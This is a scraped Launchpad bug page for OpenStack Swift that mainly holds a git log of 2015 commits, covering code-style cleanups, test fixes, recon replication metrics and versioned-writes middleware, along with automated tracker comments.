Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 11:06:52 2015 +0200

    pep8: Fix usage of the l10n _('...') function
    
    Fix the pep8 warning H702 "Formatting operation should be outside of
    localization method call".
    
    For the logger, pass parameters as indexed parameters instead of using
    the string str%args operator, the logger is more reliable in case of
    formatting error.
    
    Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55

commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Sun Aug 16 10:34:26 2015 +0200

    pep8: replace deprecated calls to assert_()
    
    The TestCase.assert_() has been deprecated in Python 2.7. Replace it
    with assertTrue() or even better methods (assertIn, assertNotIn,
    assertIsInstance) which provide better error messages.
    
    Change-Id: I21c730351470031a2dabe5238693095eabdb8964

commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner &lt;vstinner@redhat.com&gt;
Date:   Mon Jul 27 18:55:01 2015 +0200

    pep8: Fix hacking H232 warnings (octal)
    
    Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
    written as 0o1234".
    
    Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616

commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini &lt;ccontini@cloudops.com&gt;
Date:   Wed Aug 12 15:00:45 2015 -0400

    Keep user id and project id in subrequests env
    
    Keep HTTP_X_USER_ID and HTTP_X_PROJECT_ID to be available as
    user_id and project_id in storage.objects.outgoing.bytes in
    ceilometer when downloading a multipart object.
    
    Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
    Closes-Bug: #1477283

commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Mon Aug 17 22:13:42 2015 -0700

    move global statement up a few lines
    
    Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb

commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani &lt;roumani@ca.ibm.com&gt;
Date:   Mon Aug 3 17:45:56 2015 -0400

    Doc instructions for post rebase steps
    
    Improve the 'first_contribution_swift' by adding instructions for how to
    rebuild swift following a rebase.
    
    Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15

commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai &lt;osanai.hisashi@jp.fujitsu.com&gt;
Date:   Wed Dec 3 06:15:16 2014 +0900

    Enable Object Replicator's failure count in recon
    
    This patch makes the count of object replication failure in recon.
    And "failure_nodes" is added to Account Replicator and
    Container Replicator.
    
    Recon shows the count of object repliction failure as follows:
    $ curl http://&lt;ip&gt;:&lt;port&gt;/recon/replication/object
    {
        "replication_last": 1416334368.60865,
        "replication_stats": {
            "attempted": 13346,
            "failure": 870,
    	"failure_nodes": {
                "192.168.0.1": {"sdb1": 3},
                "192.168.0.2": {"sdb1": 851,
                                "sdc1": 1,
                                "sdd1": 8},
                "192.168.0.3": {"sdb1": 3,
                                "sdc1": 4}
    	},
            "hashmatch": 0,
            "remove": 0,
            "rsync": 0,
            "start": 1416354240.9761429,
            "success": 1908
        },
        "replication_time": 2316.5563162644703,
        "object_replication_last": 1416334368.60865,
        "object_replication_time": 2316.5563162644703
    }
    
    Note that 'object_replication_last' and 'object_replication_time' are
    considered to be transitional and will be removed in the subsequent
    releases. Use 'replication_last' and 'replication_time' instead.
    
    Additionaly this patch adds the count in swift-recon and it will be
    showed as follows:
    $ swift-recon object -r
    ========================================================================
    =======
    --&gt; Starting reconnaissance on 4 hosts
    ========================================================================
    =======
    [2014-11-27 16:14:09] Checking on replication
    [replication_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
    no_result: 0, reported: 4
    [replication_success] low: 3, high: 3, avg: 3.0, total: 12,
    Failed: 0.0%, no_result: 0, reported: 4
    [replication_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
    no_result: 0, reported: 4
    [replication_attempted] low: 1, high: 1, avg: 1.0, total: 4,
    Failed: 0.0%, no_result: 0, reported: 4
    Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
    192.168.0.4:6002.
    Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
    192.168.0.1:6002.
    ========================================================================
    =======
    
    In case there is a cluster which has servers, a server runs with this
    patch and the other servers run without this patch. If swift-recon
    executes on the server which runs with this patch, there are unnecessary
    information on the output such as [failure], [success] and [attempted].
    Because other servers which run without this patch are not able to
    send a response with information that this patch needs.
    Therefore once you apply this patch, you also apply this patch to other
    servers before you execute swift-recon.
    
    DocImpact
    Change-Id: Iecd33655ae2568482833131f422679996c374d78
    Co-Authored-By: Kenichiro Matsuda &lt;matsuda_kenichi@jp.fujitsu.com&gt;
    Co-Authored-By: Brian Cline &lt;bcline@softlayer.com&gt;
    Implements: blueprint enable-object-replication-failure-in-recon

commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede &lt;cschwede@redhat.com&gt;
Date:   Thu Aug 6 07:21:15 2015 +0000

    Make swift-ring-builder filename usage more consistent
    
    Sometimes the given argument is internally altered and another filename is used
    without a note to the operator. Even worse, a given .ring.gz filename is
    sometimes written out as builder file, without updating the corresponding
    .builder file.
    
    There is already a method to parse the given argv and return the name of the
    builder and ring file. However, it's rarely used and no warning is given to the
    user if it is altered. This patch uses the already parsed builder and ring file
    name instead of argv[1], and also adds a note to the user if the used filename
    is differently to the one given as argument.
    
    Closes-Bug: 1482096
    Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2

commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Mon Aug 17 13:54:44 2015 -0500

    Quorum on durable response is too low
    
    Increase the .durable quorum from 2 to "parity + 1" to guarantee
    that we will never fail to rebuild an object.  Otherwise, with
    low durable responses back (&lt; parity + 1), the putter objects
    return with failed attribute set to true, thereby failing the
    rebuild of fragments for an object.
    
    Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
    Closes-Bug: 1484565

commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang &lt;zakir.exe@gmail.com&gt;
Date:   Fri Aug 14 16:46:35 2015 -0700

    Fix some minor typos
    
    Fixed some typos in function name and comments.
    
    Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2

commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki &lt;tsuyuzaki.kota@lab.ntt.co.jp&gt;
Date:   Wed Jul 22 10:39:22 2015 -0700

    Fix EC range GET/COPY handling
    
    When range GET (or COPY) for an EC object requested, if the requested range
    starts from more than last segments alignment (i.e.
    ceil(object_size/segment_size) * segment_size), proxy server will return
    the original content length w/o body, though Swift should return an error
    massage as a body and the length of message as the content length.
    The current behavior will cause stuck on some client. (e.g. curl)
    
    This patch fixes that proxy enables to return correct response, even if such
    an over range requested.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
    Closes-Bug: #1475499

commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
Date:   Tue Aug 11 10:17:20 2015 -0500

    Fix 500 in versioned writes with bad Destination
    
    When this code lived in the proxy, it was protected by an "except
    HTTPException" clause in proxy.Application.handle_request(). When it
    moved to middleware, it lost that, and then things like
    constraints.check_name_format that raised HTTPException would cause
    500s. The HTTPException would make it all the way out to catch_errors
    and get translated to a 500.
    
    This commit just wraps a couple try/excepts around the bits in
    versioned writes that can raise HTTPException. I tried to make it use
    wsgify so I could get that for free, but that wound up being a real
    pain because env/start_response are plumbed through pretty much the
    whole versioned-writes middleware.
    
    Closes-Bug: 1483705
    
    Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25

commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva &lt;thiago@redhat.com&gt;
Date:   Sun Nov 9 13:13:27 2014 -0500

    versioned writes middleware
    
    Rewrite object versioning as middleware to simplify the PUT method
    in the object controller.
    
    The functionality remains basically the
    same with the only major difference being the ability to now
    version slo manifest files. dlo manifests are still not
    supported as part of this patch.
    
    Co-Authored-By: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
    
    DocImpact
    Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
    Signed-off-by: Thiago da Silva &lt;thiago@redhat.com&gt;
    Signed-off-by: Prashanth Pai &lt;ppai@redhat.com&gt;

commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Tue Jul 28 10:31:54 2015 +0100

    Replace assertTrue(not &lt;condition&gt;) with assertFalse(&lt;condition&gt;)
    
    The replacement of assert_ with assertTrue [1] resulted in a number of
    tests using calls of the form assertTrue(not &lt;condition&gt;). This patch
    replaces those with assertFalse(&lt;condition&gt;).
    
    [1] change I74705c6498249337bfdf955d62e0ad972035bc1f
    
    Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1

commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;
Date:   Fri Aug 7 22:07:01 2015 +0800

    Fix some spelling typo in comments
    
    s/overide/override for object-expirer.conf and sample.
    s/automaticaly/automatically for swift/proxy/controllers/obj.py
    
    Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
    Signed-off-by: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;

commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Thu Aug 6 00:55:36 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3,changes in
    dir:
    *test/unit/obj/*
    *test/unit/test_locale/*
    
    Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b

commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;
Date:   Fri Aug 7 21:57:08 2015 +0800

    Fix a spelling typo in comment
    
    s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
    
    Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
    Signed-off-by: Zhao Lei &lt;zhaolei@cn.fujitsu.com&gt;

commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Thu Aug 6 10:01:17 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/unit/proxy/*
    
    Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6

commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Thu Aug 6 09:28:51 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/probe/*
    
    Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5

commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber &lt;wbhuber@us.ibm.com&gt;
Date:   Wed Aug 5 14:51:32 2015 -0500

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in the following dir:
    test/functional/*
    
    Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405

commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda &lt;matsuda_kenichi@jp.fujitsu.com&gt;
Date:   Thu Aug 6 10:13:02 2015 +0900

    Fix shebang of commands
    
    Fix shebang of following commands.
      $ grep '#!/usr/bin/python' swift/bin/*
      swift/bin/swift-account-info:#!/usr/bin/python
      swift/bin/swift-container-info:#!/usr/bin/python
      swift/bin/swift-container-sync:#!/usr/bin/python
      swift/bin/swift-recon:#!/usr/bin/python
      swift/bin/swift-ring-builder:#!/usr/bin/python
      swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
    
    Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
    Closes-Bug: #1481623

commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev &lt;zaitcev@kotori.zaitcev.us&gt;
Date:   Wed Aug 5 15:33:29 2015 -0600

    Having said H, I, J, we ought to say K
    
    In the long run, we might want to stop these updates. But this
    decision is above my pay grade.
    
    Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b

commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Thu Aug 6 00:18:52 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in
    dir: test/unit/container/*
    
    Change-Id: I3333022ed63ce03198bc73147246d91d2442a440

commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Wed Aug 5 22:32:02 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3, fixing in:
    dir: test/unit/cli/*
    
    Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318

commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Wed Aug 5 22:25:46 2015 +0530

    pep8 fix: assertEquals -&gt; assertEqual
    
    assertEquals is deprecated in py3 in
    dir : test/unit/account/*
    
    Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7

commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin &lt;blmartin@us.ibm.com&gt;
Date:   Mon Jul 27 14:19:09 2015 -0500

    +Document method to avoid rsync filling root drive
    
    When rsync pushes to a remote node with an unmounted drive and if
    certain steps are not taken, rsync may attempt to write files to
    the local drive at the location where the drive was mounted.
    
    There are two suggested solutions for this issue:
      1) Set the permissions for all mount points in /srv/node/
           to root:root 755
      2) Mount the drives elsewhere and symlink the drives to /srv/.../
    
    The first method ensures that only root and not the swift user
    can write in the /srv/.../ directories.
    
    The second method will prompt a broken link issue if rsync
    attempts to write to an unmounted drive.
    
    Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
    Closes-Bug: #1470576

commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu &lt;charles0126@gmail.com&gt;
Date:   Wed Aug 5 22:09:40 2015 +0800

    Add extra_header_count to document and config.
    
    Change-Id: Iec86b488d71553c295afe7098822ce2046df9546

commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Tue Aug 4 23:15:37 2015 -0700

    Fix TypeError if backend response doesn't have expected headers
    
    There was some debug logging mixed in with some error handling on PUTs
    that was relying on a very specific edge would only encounter a set of
    backend responses that included the expected set of headers to diagnoise
    the failure.
    
    But the backend responses may not always have the expected headers.
    
    The proxy debug logging should be more robust to missing headers.
    
    It's a little hard to follow, but if you look `_connect_put_node` in
    swift.proxy.controller.obj - you'll see that only a few connections can
    make their way out of the initial put connection handling with a "resp"
    attribute that is not None.  In the happy path (e.g. 100-Continue) it's
    explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
    connection will be established to the next node in the node iter.
    
    Some status code will however allow a conn to be returned for validation
    in `_check_failure_put_connections`, i.e.
    
      * 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
      * 409 - Conflict with another timestamp
      * 412 - If-None-Match that encounters another object
    
    ... so I added tests for those - fixing a TypeError along the way.
    
    Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2

commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz &lt;dpgoetz@gmail.com&gt;
Date:   Fri Jun 26 17:27:31 2015 -0700

    Speed up reaper for a big account delete and some better error handling
    
    In run_forever mode, run the reaper on all three copies of the account
    DB instead of just the first one and shard the containers between them.
    
    Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765

commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot &lt;openstack-infra@lists.openstack.org&gt;
Date:   Tue Aug 4 06:29:11 2015 +0000

    Imported Translations from Transifex
    
    For more information about this automatic import see:
    https://wiki.openstack.org/wiki/Translations/Infrastructure
    
    Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93

commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME &lt;natsume.takashi@lab.ntt.co.jp&gt;
Date:   Tue Aug 4 10:14:25 2015 +0900

    Fix typo of 'receive'
    
    Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c

commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz &lt;brian.reitz@oracle.com&gt;
Date:   Mon Aug 3 16:28:31 2015 -0500

    Convert docstring to a comment in test_denied_DELETE_of_versioned_object unit test.
    
    Docstrings cause issues for nose and created non standard test output for this test.
    
    Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86

commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Mon Aug 3 14:58:24 2015 +0100

    Test that get_hashes ignores only removed hash dir
    
    Add test for case not yet covered by unit tests: suffix dir
    has two hash dirs, one with expired tombstone. That hash dir gets
    removed and its hash is not included in the suffix hash, but the
    remaining hash dir's hash is reported.
    
    Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3

commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Mon Jul 20 13:06:48 2015 -0700

    Handle removed suffix dirs the same as empty suffix dirs
    
    When hashes suffix dirs, the directory might have gotten cleaned up while
    still appearing in hashes.pkl.  It would even get cleaned up the next time.
    
    For example, given this really old tombstone:
    
        objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
    
    Prior to this commit, a call to get_hashes() would reap the old
    tombstone and any empty containing dirs, but the resulting hashes.pkl
    would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
    though there's no such suffix dir any more.
    ("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
    
    Then, a *subsequent* get_hashes() call would omit 3d0 from the resulting
    hash, so then hashes.pkl would no longer contain 3d0. This difference
    would result in a little useless replication traffic while nodes without
    a particular part/suffix pair, but who disagreed on how that showed up
    in hashes.pkl, tried to push their version of nothing to one another.
    
    Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
    it's for replication or EC, or whether it's for the get_hashes() call
    that reaped the suffix dirs or not.
    
    Co-Author: Samuel Merritt &lt;sam@swiftstack.com&gt;
    
    Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f

commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles &lt;alistair.coles@hp.com&gt;
Date:   Fri Jun 5 13:06:29 2015 +0100

    Make test_proxy work independent of env vars
    
    test.unit.common.test_internal_client.TestSimpleClient.test_proxy
    will fail if the environment has http_proxy set and does not have
    no_proxy=127.0.0.1 set. This seems to be because urllib overrides
    any proxy arg passed to the Request with the env http_proxy var,
    unless the Request host is in no_proxy.
    
    We don't need to test urllib, so this patch changes the test to
    simply ensure that swift code does pass the correct proxy arg to
    urllib2.urlopen. That avoids testers having to make sure their
    env vars are compliant to successfully run unit tests. While it is
    reasonable to think that 127.0.0.1 is in the no_proxy list, it
    shouldn't be a requirement pass swift tests.
    
    Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817

commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sat Jun 27 23:26:47 2015 +0530

    Adding bandit for security static analysis testing in swift
    
    This change adds a basic bandit config for Swift. It can be invoked
    by running the tox environment for bandit;
        tox -e bandit
    
    This is an initial step for using bandit with Swift
    and it should be revisited to improve the testing as more is learned
    about the specific needs of the Swift code base.As per now some tests
    are excluded as they were used on purpose.
    
    https://wiki.openstack.org/wiki/Security/Projects/Bandit
    
    Implements: blueprint swift-bandit
    
    Change-Id: I621be9a68ae9311f3a6eadd1636b05e646260cf2

commit 768d7ab074807175471d589de96d091e3239052e
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Thu Jul 30 15:30:35 2015 -0700

    Add a probetest for HUP/reload
    
    This would have been enough to catch the regression, and we can extend
    them as we work on any future ehancements to our process management.
    
    Change-Id: I9a1b57aa15663380c45cf783afc8212ab4ffbace

commit c5b5cf91a984f80cc6cbe42735b242083d700542
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Tue Jul 28 21:03:05 2015 +0530

    test/unit: Replace python print operator with print function (pep H233, py33)
    
    'print' function is compatible with 2.x and 3.x python versions
    Link : https://www.python.org/dev/peps/pep-3105/
    
    Python 2.6 has a __future__ import that removes print as language syntax,
    letting you use the functional form instead
    
    Change-Id: I94e1bc6bd83ad6b05695c7ebdf7cbfd8f6d9f9af

commit dd2f1be3b124d3901ebbc176a7adc462b6449667
Author: Ondrej Novy &lt;ondrej.novy@firma.seznam.cz&gt;
Date:   Tue Jun 16 17:42:58 2015 +0200

    Time synchronization check in recon.
    
    This change add call time to recon middleware and param --time to
    recon CLI. This is usefull for checking if time in cluster is
    synchronized.
    
    Change-Id: I62373e681f64d0bd71f4aeb287953dd3b2ea5662

commit cbcfb74132aba4d5834dc9cf33dc4f664b82d39a
Author: Clay Gerrard &lt;clay.gerrard@gmail.com&gt;
Date:   Wed Jul 22 19:32:46 2015 -0700

    Cleanup nits from container_update_timeout
    
    Change-Id: Ib17fc9a027db267350abc5a7db4e3172dfff7913

commit 2289137164231d7872731c2cf3d81b86f34f01a4
Author: John Dickinson &lt;me@not.mn&gt;
Date:   Sat May 23 15:40:03 2015 -0700

    do container listing updates in another (green)thread
    
    The actual server-side changes are simple. The tests are a different
    matter. Many changes were needed to the object server tests to
    handle the now-async calls to the container server. In an effort to
    test this properly, some drive-by changes were made to improve tests.
    
    I tested this patch by doing zero-byte object writes to one container
    as fast as possible. Then I did it again while also saturating 2 of the
    container replica's disks. The results are linked below.
    
    https://gist.github.com/notmyname/2bb85acfd8fbc7fc312a
    
    DocImpact
    
    Change-Id: I737bd0af3f124a4ce3e0862a155e97c1f0ac3e52

commit c8131c6abb17b00b043a9b95e65be819e1fd3c9d
Author: janonymous &lt;janonymous.codevulture@gmail.com&gt;
Date:   Sun Jul 12 14:48:35 2015 +0530

    sys.exc_type/exc_value/exc_traceback are Deprecated
    
    sys.exc_info() contains a tuple of these three.
    
    Change-Id: I530cbeb37c43da98b4924db41f6604871077bd47
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-feature-crypto
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
    
    <time title="2015-09-08 12:15:27 UTC" datetime="2015-09-08T12:15:27.766992+00:00">on 2015-09-08</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/35" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-08T17:03:07.020684+00:00" title="2015-09-08 17:03:07 UTC">on 2015-09-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/35">
                <strong>Related fix proposed to swift (feature/hummingbird)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/35"> #35</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Related fix proposed to branch: feature/hummingbird<br />
Review: <a rel="nofollow" href="https://review.openstack.org/221410">https:/<wbr />/review.<wbr />openstack.<wbr />org/221410</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Related fix proposed to branch: feature/hummingbird
Review: https://review.openstack.org/221410</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/36" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-08T20:44:26.670432+00:00" title="2015-09-08 20:44:26 UTC">on 2015-09-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/swift/+bug/1453948/comments/36">
                <strong>Related fix merged to swift (feature/hummingbird)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/swift/+bug/1453948/comments/36"> #36</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/swift/+bug/1453948/comments/36/+download">Download full text</a> (70.7 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.openstack.org/221410">https:/<wbr />/review.<wbr />openstack.<wbr />org/221410</a><br />
Committed: <a rel="nofollow" href="https://git.openstack.org/cgit/openstack/swift/commit/?id=eb8f1f83f1cfc63d8452bc30096fd1c145781527">https:/<wbr />/git.openstack.<wbr />org/cgit/<wbr />openstack/<wbr />swift/commit/<wbr />?id=eb8f1f83f1c<wbr />fc63d8452bc3009<wbr />6fd1c145781527</a><br />
Submitter: Jenkins<br />
Branch:    feature/hummingbird</p>
<p>commit cb683d391cb66d0<wbr />f52830de16760c8<wbr />0fd2afedf9<br />
Author: OpenStack Proposal Bot &lt;email address hidden&gt;<br />
Date:   Sat Sep 5 06:17:51 2015 +0000</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Imported Translations from Transifex</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;For more information about this automatic import see:<br />
&nbsp;&nbsp;&nbsp;&nbsp;<a rel="nofollow" href="https://wiki.openstack.org/wiki/Translations/Infrastructure">https:/<wbr />/wiki.openstack<wbr />.org/wiki/<wbr />Translations/<wbr />Infrastructure</a></p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I2d92b8e34a665f<wbr />b0bb4c048cfb0c5<wbr />9de295dfce6</p>
<p>commit e4542455c8a07b7<wbr />981c247df8b7378<wbr />16062c1655<br />
Author: Emett Speer &lt;email address hidden&gt;<br />
Date:   Wed Sep 2 17:18:03 2015 -0700</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;[Labs] Update links to Cloud Admin Guide</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Update links to the Cloud Admin Guide after the<br />
&nbsp;&nbsp;&nbsp;&nbsp;RST conversion of that book altered URLs.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I899f8938498b74<wbr />4e62887968a65e5<wbr />8c00ef27f1b</p>
<p>commit 58fcc0752397830<wbr />6cd3889ada73af5<wbr />d9e664cf59<br />
Author: Christian Schwede &lt;email address hidden&gt;<br />
Date:   Wed Sep 2 10:52:34 2015 +0000</p>
